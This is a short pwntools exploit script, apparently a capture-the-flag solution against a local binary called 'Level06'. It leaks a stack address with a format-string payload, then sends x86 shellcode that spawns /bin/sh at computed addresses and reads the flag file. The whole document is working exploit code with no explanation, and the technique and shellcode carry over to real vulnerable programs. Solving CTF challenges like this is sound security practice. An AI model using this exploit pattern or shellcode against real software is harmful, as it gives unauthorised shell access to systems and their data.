from pwn import*

p = process('./Level06')
#gdb.attach(p, api=True)

payload = b"%4$p"
p.sendline(payload)

p.recvuntil(b"0x")
stack_leak = int(p.recv(8),16)
shellcode = b"\x31\xdb\xb3\x03\x31\xc9\xb1\x03\xfe\xc9\x31\xc0\xb0\x3f\xcd\x80\x80\xf9\xff\x75\xf3\x31\xc9\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
payload = b"a"*4 + p32(stack_leak - 32) + p32(stack_leak - 44) + b"a"*4 + shellcode

p.sendline(payload)

p.sendline(' ')
p.sendline('cat flag')

p.interactive()
